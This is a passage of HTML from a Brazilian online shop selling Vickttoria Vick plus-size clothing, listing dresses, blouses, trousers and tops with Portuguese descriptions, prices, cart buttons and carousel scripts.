                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/vestido-raina-plus-size">Vestido Raina Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Vestido RainaVestido grippir plus size na cor marinho, Decote em V. Cintura marcada. Saia levemente evasê com um macho na cintura, só na frente. Todo forrado de cetim marinho. Mangas 3/4. Um vestido s..</p>

                                
                                <p class="price">
                   
                  R$414,00
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/vestido-raina-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('2119');" class="btn btn-primary">Comprar</button>
                </div>
                </div>
                
      </div>
    </div>
  </div>
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('1933');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('1933');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Blusa Timeless De GrippirTúnica plus size em grippir nude. Forrada com musseline nude. Decote semi canoa. Mangas 7/8 com um super jabôo. Uma blusa maravilhosa, elegante e clássica !Marca VICKTTORIA VI.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/blusa-timeless-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('1933');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/blusa-timeless-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/blusa-plus-size/blusa-timeless-plus-size_1933_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/blusa-plus-size/blusa-timeless-plus-size_1933_1-400x400.jpg" alt="Blusa Timeless Plus Size" title="Blusa Timeless Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/blusa-plus-size/blusa-timeless-plus-size_1933_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/blusa-plus-size/blusa-timeless-plus-size_1933_2-400x400.jpg" alt="Blusa Timeless Plus Size" title="Blusa Timeless Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/blusa-timeless-plus-size">Blusa Timeless Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Blusa Timeless De GrippirTúnica plus size em grippir nude. Forrada com musseline nude. Decote semi canoa. Mangas 7/8 com um super jabôo. Uma blusa maravilhosa, elegante e clássica !Marca VICKTTORIA VI..</p>

                                
                                <p class="price">
                   
                  R$267,00
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/blusa-timeless-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('1933');" class="btn btn-primary">Comprar</button>
                </div>
                </div>
                
      </div>
    </div>
  </div>
  </div>
  
<script type="text/javascript"><!--
$('#slider-latest-0').owlCarousel({
	items: 4,
	singleItem: false,
	pagination: true,
	navigation: false,
	navigationText: ['<i class="fa fa-chevron-left fa-5x"></i>', '<i class="fa fa-chevron-right fa-5x"></i>']
});
--></script>
</div>


 <div id="tab-bestseller-0" class="row product-items fade tab-pane">
 <div id="slider-bestseller-0">
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('320');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('320');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Calça Malha &nbsp;Preto

Calça preto&nbsp;social, Plus Size em malha eurocaram com zipper na frente, cós e bolsos traseiro.

Marca VICKTTORIA VICK Plus Size.

Composição Têxtil

90%Poliamida
.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/calca-malha-preto-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('320');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/calca-malha-preto-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-malha-preto-plus-size_320_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-malha-preto-plus-size_320_1-400x400.jpg" alt="Calça Malha Preto Plus Size" title="Calça Malha Preto Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-malha-preto-plus-size_320_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-malha-preto-plus-size_320_2-400x400.jpg" alt="Calça Malha Preto Plus Size" title="Calça Malha Preto Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/calca-malha-preto-plus-size">Calça Malha Preto Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Calça Malha &nbsp;Preto

Calça preto&nbsp;social, Plus Size em malha eurocaram com zipper na frente, cós e bolsos traseiro.

Marca VICKTTORIA VICK Plus Size.

Composição Têxtil

90%Poliamida
..</p>
                
                                
                                <p class="price">
                   
                  R$278,00
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/calca-malha-preto-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('320');" class="btn btn-primary">Comprar</button>
                </div>
                </div>
                
      </div>
    </div>
  </div>
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('2117');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('2117');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Vestido ElisaVestido Plus Size em crepom estampado. Decote redondo com abertura e rolitê para dar um laçarote. Vestido levemente evasê, com recortes em ajhur preto só na frente. Mangas 3/4, com abertu.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/vestido-elisa-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('2117');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/vestido-elisa-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-elisa-plus-size_2117_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-elisa-plus-size_2117_1-400x400.jpg" alt="Vestido Elisa Plus Size" title="Vestido Elisa Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-elisa-plus-size_2117_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-elisa-plus-size_2117_2-400x400.jpg" alt="Vestido Elisa Plus Size" title="Vestido Elisa Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/vestido-elisa-plus-size">Vestido Elisa Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Vestido ElisaVestido Plus Size em crepom estampado. Decote redondo com abertura e rolitê para dar um laçarote. Vestido levemente evasê, com recortes em ajhur preto só na frente. Mangas 3/4, com abertu..</p>
                
                                
                                <p class="price">
                   
                  R$269,00
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/vestido-elisa-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('2117');" class="btn btn-primary">Comprar</button>
                </div>
                </div>
                
      </div>
    </div>
  </div>
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('697');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('697');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Camiseta Black Básica

Camiseta viscolycra preta;

Mangas curta;

Decote em V.

Uma básica preta é mais uma em nossas vidas corridas. É aquela peça que nos salva quase sempre. Você vai ficar u.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/camiseta-black-basica-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('697');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/camiseta-black-basica-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camiseta-plus-size/camiseta-black-basica-plus-size_697_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camiseta-plus-size/camiseta-black-basica-plus-size_697_1-400x400.jpg" alt="Camiseta Black Básica Plus Size" title="Camiseta Black Básica Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camiseta-plus-size/camiseta-black-basica-plus-size_697_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camiseta-plus-size/camiseta-black-basica-plus-size_697_2-400x400.jpg" alt="Camiseta Black Básica Plus Size" title="Camiseta Black Básica Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/camiseta-black-basica-plus-size">Camiseta Black Básica Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Camiseta Black Básica

Camiseta viscolycra preta;

Mangas curta;

Decote em V.

Uma básica preta é mais uma em nossas vidas corridas. É aquela peça que nos salva quase sempre. Você vai ficar u..</p>
                
                                
                                <p class="price">
                   
                  R$97,00
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/camiseta-black-basica-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('697');" class="btn btn-primary">Comprar</button>
                </div>
                </div>
                
      </div>
    </div>
  </div>
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('320');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('320');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Calça Malha &nbsp;Preto

Calça preto&nbsp;social, Plus Size em malha eurocaram com zipper na frente, cós e bolsos traseiro.

Marca VICKTTORIA VICK Plus Size.

Composição Têxtil

90%Poliamida
.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/calca-malha-preto-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('320');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/calca-malha-preto-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-malha-preto-plus-size_320_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-malha-preto-plus-size_320_1-400x400.jpg" alt="Calça Malha Preto Plus Size" title="Calça Malha Preto Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-malha-preto-plus-size_320_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-malha-preto-plus-size_320_2-400x400.jpg" alt="Calça Malha Preto Plus Size" title="Calça Malha Preto Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/calca-malha-preto-plus-size">Calça Malha Preto Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Calça Malha &nbsp;Preto

Calça preto&nbsp;social, Plus Size em malha eurocaram com zipper na frente, cós e bolsos traseiro.

Marca VICKTTORIA VICK Plus Size.

Composição Têxtil

90%Poliamida
..</p>
                
                                
                                <p class="price">
                   
                  R$278,00
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/calca-malha-preto-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('320');" class="btn btn-primary">Comprar</button>
                </div>
                </div>
                
      </div>
    </div>
  </div>
  </div>
<script type="text/javascript"><!--
$('#slider-bestseller-0').owlCarousel({
	items: 4,
	singleItem: false,
	pagination: true,
	navigation: false,
	navigationText: ['<i class="fa fa-chevron-left fa-5x"></i>', '<i class="fa fa-chevron-right fa-5x"></i>']
});
--></script>
 </div>

  <div id="tab-featured-0" class="row product-items fade tab-pane">
  <div id="slider-featured-0">
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('1971');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('1971');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Blusa Hadassa Grippir&nbsp;Túnica plus size em renda grippir na cor preta, e forrada com musseline da mesma cor. Decote semi canoa. Mangas 3/4 com um lindo jabôo. Super elegante, fina e clássica.Marca.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/blusa-hadassa-grippir-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('1971');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/blusa-hadassa-grippir-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-malha-preto-plus-size_320_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/blusa-plus-size/blusa-hadassa-grippir-plus-size_1971_1-400x400.jpg" alt="Blusa Hadassa Grippir Plus Size" title="Blusa Hadassa Grippir Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-malha-preto-plus-size_320_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/blusa-plus-size/blusa-hadassa-grippir-plus-size_1971_2-400x400.jpg" alt="Blusa Hadassa Grippir Plus Size" title="Blusa Hadassa Grippir Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
            
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/blusa-hadassa-grippir-plus-size">Blusa Hadassa Grippir Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Blusa Hadassa Grippir&nbsp;Túnica plus size em renda grippir na cor preta, e forrada com musseline da mesma cor. Decote semi canoa. Mangas 3/4 com um lindo jabôo. Super elegante, fina e clássica.Marca..</p>
                
                                
                                <p class="price">
                   
                  R$267,00
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/blusa-hadassa-grippir-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('1971');" class="btn btn-primary">Comprar</button>
                </div>
                </div> 
                
      </div>
    </div>
  </div>
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('2120');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('2120');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Vestido LeonorVestido plus size em sedinha com toque de viscose. Busto trasnpassado. Manga 3/4 boca de sino. Saia evasê. Zipper atrás. Nossa como ficou leve este vestido. O tecido tem um toque muito b.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/vestido-leonor-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('2120');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/vestido-leonor-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-malha-preto-plus-size_320_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-leonor-plus-size_2120_1-400x400.jpg" alt="Vestido Leonor Plus Size" title="Vestido Leonor Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-malha-preto-plus-size_320_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-leonor-plus-size_2120_2-400x400.jpg" alt="Vestido Leonor Plus Size" title="Vestido Leonor Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
            
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/vestido-leonor-plus-size">Vestido Leonor Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Vestido LeonorVestido plus size em sedinha com toque de viscose. Busto trasnpassado. Manga 3/4 boca de sino. Saia evasê. Zipper atrás. Nossa como ficou leve este vestido. O tecido tem um toque muito b..</p>
                
                                
                                <p class="price">
                   
                  R$216,00
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/vestido-leonor-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('2120');" class="btn btn-primary">Comprar</button>
                </div>
                </div> 
                
      </div>
    </div>
  </div>
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('1325');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('1325');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Regata Poáh FabríciaRegata plus size e koshibo estampado. Regata com mix de estampas decote quadrado e detalhe de tecido em V todo pespontado. Muito prática e ótima para os dias quentes ou para usar u.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/regata-poah-fabricia-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('1325');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/regata-poah-fabricia-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-malha-preto-plus-size_320_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/regata-plus-size/regata-poah-fabricia-plus-size_1325_1-400x400.jpg" alt="Regata Poáh Fabrícia Plus Size" title="Regata Poáh Fabrícia Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-malha-preto-plus-size_320_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/regata-plus-size/regata-poah-fabricia-plus-size_1325_2-400x400.jpg" alt="Regata Poáh Fabrícia Plus Size" title="Regata Poáh Fabrícia Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
            
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/regata-poah-fabricia-plus-size">Regata Poáh Fabrícia Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Regata Poáh FabríciaRegata plus size e koshibo estampado. Regata com mix de estampas decote quadrado e detalhe de tecido em V todo pespontado. Muito prática e ótima para os dias quentes ou para usar u..</p>
                
                                
                                <p class="price">
                   
                  R$129,00
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/regata-poah-fabricia-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('1325');" class="btn btn-primary">Comprar</button>
                </div>
                </div> 
                
      </div>
    </div>
  </div>
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('1945');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('1945');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Calça GabrielaCalça plus size em gabardine com strech, com fundo branco. Cós anatômico. Zipper invisível lateral. Muito confortável esta calça. E a estampa, está muito chique e discreta. E apesar de s.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/calca-gabriela-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('1945');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/calca-gabriela-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-malha-preto-plus-size_320_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-gabriela-plus-size_1945_1-400x400.jpg" alt="Calça Gabriela Plus size" title="Calça Gabriela Plus size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-malha-preto-plus-size_320_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/calca-plus-size/calca-gabriela-plus-size_1945_2-400x400.jpg" alt="Calça Gabriela Plus size" title="Calça Gabriela Plus size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
            
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/calca-gabriela-plus-size">Calça Gabriela Plus size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Calça GabrielaCalça plus size em gabardine com strech, com fundo branco. Cós anatômico. Zipper invisível lateral. Muito confortável esta calça. E a estampa, está muito chique e discreta. E apesar de s..</p>
                
                                
                                <p class="price">
                   
                  R$182,00
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/calca-gabriela-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('1945');" class="btn btn-primary">Comprar</button>
                </div>
                </div> 
                
      </div>
    </div>
  </div>
  </div>
<script type="text/javascript"><!--
$('#slider-featured-0').owlCarousel({
	items: 4,
	singleItem: false,
	pagination: true,
	navigation: false,
	navigationText: ['<i class="fa fa-chevron-left fa-5x"></i>', '<i class="fa fa-chevron-right fa-5x"></i>']
});
--></script> 
 </div>

 <div id="tab-special-0" class="row product-items fade tab-pane">
 <div id="slider-special-0">
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                        
                                    <span class="badge sale">-71%</span>
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('1243');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('1243');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Vestido Maísa Decote Vazado

Vestido plus size em malha estampada com fundo areia. Decote vazado, recortes na frente, faixa lateral bicolor, zipper nas costas, mangas 3/4. Super confortável, elegant.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/vestido-maisa-decote-vazado-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('1243');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/vestido-maisa-decote-vazado-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-maisa-decote-vazado-plus-size_1243_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-maisa-decote-vazado-plus-size_1243_1-400x400.jpg" alt="Vestido Maísa Decote Vazado Plus Size" title="Vestido Maísa Decote Vazado Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-maisa-decote-vazado-plus-size_1243_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-maisa-decote-vazado-plus-size_1243_2-400x400.jpg" alt="Vestido Maísa Decote Vazado Plus Size" title="Vestido Maísa Decote Vazado Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
